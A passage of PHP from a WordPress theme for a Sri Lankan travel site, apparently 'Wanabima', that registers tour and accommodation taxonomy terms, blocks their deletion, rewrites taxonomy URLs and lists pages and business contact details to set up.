            'description'   => 'This is 4x4 adventure',
        ),

//  TODO
//        '6' => array (
//            'taxonomy'      => 'fourbyfour_taxonomy',
//            'name'          => 'Mud Fun',
//            'slug'          => 'mud-fun',
//            'description'   => 'This is Mud Fun',
//        ),
//
//        '7' => array (
//            'taxonomy'      => 'fourbyfour_taxonomy',
//            'name'          => '4x4 Rally',
//            'slug'          => 'fourbyfour-rally',
//            'description'   => 'This is 4x4 Rally',
//        ),

        '8' => array (
            'taxonomy'      => 'tour_taxonomy',
            'name'          => 'Hideout',
            'slug'          => 'hideout',
            'description'   => 'This is Hideout',
        ),

        '9' => array (
            'taxonomy'      => 'tour_taxonomy',
            'name'          => 'Sand and Beach',
            'slug'          => 'sand-and-beach',
            'description'   => 'This is Sand and Beach',
        ),

        '10' => array (
            'taxonomy'      => 'tour_taxonomy',
            'name'          => 'Hilly and Cozy',
            'slug'          => 'hilly-and-cozy',
            'description'   => 'This is Hilly and Cozy',
        ),

        '11' => array (
            'taxonomy'      => 'tour_taxonomy',
            'name'          => 'Across the Paradise',
            'slug'          => 'across-the-paradise',
            'description'   => 'This is Across the Paradise',
        ),

        '12' => array (
            'taxonomy'      => 'accommodation_taxonomy',
            'name'          => 'Luxury Star Class Hotels',
            'slug'          => 'luxury-star-class-hotels',
            'description'   => 'This is Luxury Star Class Hotels',
        ),

        '13' => array (
            'taxonomy'      => 'accommodation_taxonomy',
            'name'          => 'Luxury Boutique Hotels',
            'slug'          => 'luxury-boutique-hotels',
            'description'   => 'This is Luxury Boutique Hotels',
        ),

        '14' => array (
            'taxonomy'      => 'accommodation_taxonomy',
            'name'          => 'Resorts and Villas',
            'slug'          => 'resorts-and-villas',
            'description'   => 'This is Resorts and Villas',
        ),

        '15' => array (
            'taxonomy'      => 'accommodation_taxonomy',
            'name'          => 'Bungalows and Home Stay',
            'slug'          => 'bungalows-and-home-stay',
            'description'   => 'This is Bungalows and Home Stay',
        ),
    );

    foreach ( $terms as $term_key=>$term) {
        wp_insert_term(
            $term['name'],
            $term['taxonomy'],
            array(
                'description'   => $term['description'],
                'slug'          => $term['slug'],
            )
        );
    }

}
add_action('init', 'register_new_terms');

//add_action( 'pre_insert_term', 'prevent_terms_adding', 1, 2 );
//function prevent_terms_adding ( $term, $taxonomy ) {
//    if ( 'camping_taxonomy' === $taxonomy || 'natureandwildlife_taxonomy' === $taxonomy || 'fourbyfour_taxonomy' === $taxonomy || 'tour_taxonomy' === $taxonomy || 'accommodation_taxonomy' === $taxonomy ) {
//        return new WP_Error( 'term_addition_blocked', __( 'You cannot add terms to this taxonomy' ) );
//    }
//
//    return $term;
//}

add_action( 'pre_delete_term', 'prevent_terms_delete', 10, 2 );
function prevent_terms_delete ( $term, $taxonomy ) {
    if ( 'camping_taxonomy' === $taxonomy || 'natureandwildlife_taxonomy' === $taxonomy || 'fourbyfour_taxonomy' === $taxonomy || 'tour_taxonomy' === $taxonomy || 'accommodation_taxonomy' === $taxonomy ) {
        return new WP_Error( 'term_addition_blocked', __( 'You cannot remove terms from this taxonomy' ) );
    }

    return $term;
}


/*
* Replace Taxonomy slug with Post Type slug in url
* Version: 1.1
*/
function taxonomy_slug_rewrite($wp_rewrite) {
    $rules = array();
    // get all custom taxonomies
    $taxonomies = get_taxonomies(array('_builtin' => false), 'objects');
    // get all custom post types
    $post_types = get_post_types(array('public' => true, '_builtin' => false), 'objects');

    foreach ($post_types as $post_type) {
        foreach ($taxonomies as $taxonomy) {

            // go through all post types which this taxonomy is assigned to
            foreach ($taxonomy->object_type as $object_type) {

                // check if taxonomy is registered for this custom type
                if ($object_type == $post_type->rewrite['slug']) {

                    // get category objects
                    $terms = get_categories(array('type' => $object_type, 'taxonomy' => $taxonomy->name, 'hide_empty' => 0));

                    // make rules
                    foreach ($terms as $term) {
                        $rules[$object_type . '/' . $term->slug . '/?$'] = 'index.php?' . $term->taxonomy . '=' . $term->slug;
                    }
                }
            }
        }
    }
    // merge with global rules
    $wp_rewrite->rules = $rules + $wp_rewrite->rules;
}
add_filter('generate_rewrite_rules', 'taxonomy_slug_rewrite');


/**
 * Important
 * = Pages to be created
 * --Camping
 * --Nature and Wildlife
 * ----Big Five With Wanabima
 * --Adventure
 * --Tours
 * --Accommodation
 * --Services
 * --Gallery
 * --Contact
 * --Inquiry
 * --Inquiry-response
 *
 * = Menu
 * --Top-menu
 * --Social
 *
 * = Widget
 * -- 1 -> Recent Wanabima Blog Post
 * -- 2 -> Pages ( exlude all keep what need )
 *
 * = Plugin
 * -- 1 -> Wanabima activity content
 * -- 2 -> Wanabima custom content
 * -- 3 -> Wanabima feature image
 * -- 4 -> Wanabima carousel image
 *
 * = Global Info
 */
$email_address = 'hello@wanabima.com';
$phone_number = '+94 77 755 4654';
$general_number = '+94 11 288 5884';

//TODO rent a car image slide
//TODO service items (3 item per line)
//TODO contact page -> thank you page.